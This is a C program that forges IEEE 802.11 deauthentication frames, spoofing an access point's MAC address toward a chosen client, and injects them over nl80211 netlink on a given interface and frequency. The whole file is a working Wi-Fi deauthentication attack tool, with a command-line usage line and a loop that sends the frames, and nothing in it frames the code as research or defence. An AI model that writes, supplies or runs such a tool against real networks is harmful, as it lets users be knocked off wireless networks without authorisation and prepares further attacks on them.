#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <linux/genetlink.h>
#include <net/if.h>
#include <errno.h>

#define NLA_ALIGN(len) (((len) + 3) & ~3)
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#define NLA_OK(nla, remaining) \
    ((remaining) >= (int)sizeof(struct nlattr) && \
     (nla)->nla_len >= sizeof(struct nlattr) && \
     (nla)->nla_len <= (remaining))
#define NLA_NEXT(nla, remaining) \
    ((remaining) -= NLA_ALIGN((nla)->nla_len), \
     (struct nlattr*)(((char*)(nla)) + NLA_ALIGN((nla)->nla_len)))

static int nl80211_family = -1;

static int get_nl80211_family(int sock) {
    struct {
        struct nlmsghdr hdr;
        struct genlmsghdr genl;
        struct nlattr attr;
        char name[16];
    } req = {0};
    
    req.hdr.nlmsg_len = sizeof(req);
    req.hdr.nlmsg_type = GENL_ID_CTRL;
    req.hdr.nlmsg_flags = NLM_F_REQUEST;
    req.genl.cmd = CTRL_CMD_GETFAMILY;
    req.attr.nla_type = CTRL_ATTR_FAMILY_NAME;
    req.attr.nla_len = sizeof(req.attr) + 8;
    strcpy(req.name, "nl80211");
    req.hdr.nlmsg_len = sizeof(req.hdr) + sizeof(req.genl) + req.attr.nla_len;
    
    send(sock, &req, req.hdr.nlmsg_len, 0);
    
    unsigned char resp[4096];
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) return -1;
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)resp;
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    
    struct nlattr *attr = (struct nlattr*)(genl + 1);
    int remaining = hdr->nlmsg_len - sizeof(*hdr) - sizeof(*genl);
    
    while (NLA_OK(attr, remaining)) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            return *(int*)(attr + 1);
        }
        attr = NLA_NEXT(attr, remaining);
    }
    return -1;
}

static int send_frame(int sock, int ifidx, const unsigned char *frame, int flen, 
                      int freq) {
    unsigned char buf[512];
    memset(buf, 0, sizeof(buf));
    
    struct nlmsghdr *hdr = (struct nlmsghdr*)buf;
    hdr->nlmsg_type = nl80211_family;
    hdr->nlmsg_flags = NLM_F_REQUEST;
    
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    genl->cmd = NL80211_CMD_FRAME;
    
    unsigned char *ptr = (unsigned char*)(genl + 1);
    
    struct nlattr *a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_IFINDEX;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = ifidx;
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_WIPHY_FREQ;
    a->nla_len = sizeof(*a) + 4;
    *(int*)(a + 1) = freq;
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_FRAME;
    a->nla_len = sizeof(*a) + flen;
    memcpy(a + 1, frame, flen);
    ptr += a->nla_len;
    
    a = (struct nlattr*)ptr;
    a->nla_type = NL80211_ATTR_DONT_WAIT_FOR_ACK;
    a->nla_len = sizeof(*a);
    ptr += a->nla_len;
    
    hdr->nlmsg_len = ptr - buf;
    
    return send(sock, buf, hdr->nlmsg_len, 0) > 0 ? 0 : -1;
}

int main(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <iface> <ap_mac> <client_mac> <freq> [reason_code]\n", argv[0]);
        return 1;
    }
    
    const char *iface = argv[1];
    int freq = atoi(argv[4]);
    int reason = (argc >= 6) ? atoi(argv[5]) : 7;  // default: class 3 from non-associated
    
    unsigned char ap[6], cl[6];
    for (int i = 0; i < 6; i++) {
        sscanf(argv[2] + i*3, "%2hhx:", &ap[i]);
        sscanf(argv[3] + i*3, "%2hhx:", &cl[i]);
    }
    
    // Deauth frame: C0 00 [dur] [RA=cl] [TA=ap] [BSSID=ap] [seq] <reason LE>
    unsigned char frame[] = {
        0xC0, 0x00, 0x3A, 0x01,
        0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
        0,0, 0,0
    };
    memcpy(frame+4, cl, 6); memcpy(frame+10, ap, 6); memcpy(frame+16, ap, 6);
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
    
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sock < 0) { perror("socket"); return 1; }
    
    struct sockaddr_nl sa = {.nl_family = AF_NETLINK};
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    
    nl80211_family = get_nl80211_family(sock);
    if (nl80211_family < 0) { fprintf(stderr, "nl80211 not found\n"); return 1; }
    printf("nl80211 family: %d\n", nl80211_family);
    
    int ifidx = if_nametoindex(iface);
    printf("Deauth %s -> %s on %s ch=%d\n", argv[2], argv[3], iface, freq);
    
    for (int i = 0; i < 5; i++) {
        if (send_frame(sock, ifidx, frame, sizeof(frame), freq) == 0)
            printf("  [+] packet %d sent\n", i+1);
        else
            printf("  [-] packet %d FAILED (%s)\n", i+1, strerror(errno));
        usleep(50000);
    }
    
    close(sock);
    return 0;
}
